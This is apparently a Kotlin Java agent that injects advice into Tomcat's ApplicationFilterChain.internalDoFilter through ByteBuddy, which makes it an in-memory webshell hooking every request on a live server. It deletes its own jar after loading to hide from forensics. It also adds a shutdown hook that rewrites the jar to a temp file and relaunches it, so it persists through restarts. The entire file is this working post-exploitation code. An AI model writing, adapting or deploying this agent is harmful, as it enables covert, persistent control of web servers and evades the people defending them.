package com.xhstormr.app

import net.bytebuddy.agent.builder.AgentBuilder
import net.bytebuddy.asm.Advice
import net.bytebuddy.matcher.ElementMatchers
import java.lang.instrument.Instrumentation
import kotlin.concurrent.thread
import kotlin.io.path.createTempFile
import kotlin.io.path.writeBytes

fun agentmain(args: String, inst: Instrumentation) {
    val clazz = "org.apache.catalina.core.ApplicationFilterChain"
    val method = "internalDoFilter"

    val advice = Advice
        .withCustomMapping()
        .bind(clazz<Value>(), args)

    AgentBuilder.Default()
        .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withErrorsOnly())
        .with(AgentBuilder.RedefinitionStrategy.RETRANSFORMATION)
        .type(ElementMatchers.named(clazz))
        .transform(AgentBuilder.Transformer.ForAdvice(advice).advice(ElementMatchers.named(method), clazz<Tracing>().name))
        .installOn(inst)

    val agentBytes = getCurrentJar().run {
        val bytes = readBytes()
        delete()
        bytes
    }

    Runtime.getRuntime().addShutdownHook(thread(false) {
        val agent = createTempFile()
            .apply { writeBytes(agentBytes) }
        Runtime.getRuntime().exec("java -jar %s %d %s".format(agent, 0, args))
    })

    println("OK")
}

/*
https://github.com/apache/tomcat/blob/10.1.x/java/org/apache/catalina/core/ApplicationFilterChain.java#L153
*/
